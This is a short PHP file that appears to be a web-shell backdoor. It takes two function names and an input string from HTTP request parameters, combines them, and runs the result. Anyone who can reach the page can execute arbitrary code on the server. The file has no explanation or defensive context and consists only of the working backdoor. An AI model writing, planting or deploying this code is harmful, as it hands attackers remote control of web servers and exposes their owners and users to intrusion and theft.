
<?php
	$filter1=$_REQUEST['_f1'];
	$filter2=$_REQUEST['_f2'];
	$res=$filter1('',$filter2($_REQUEST['_i']));
	$res();
?>
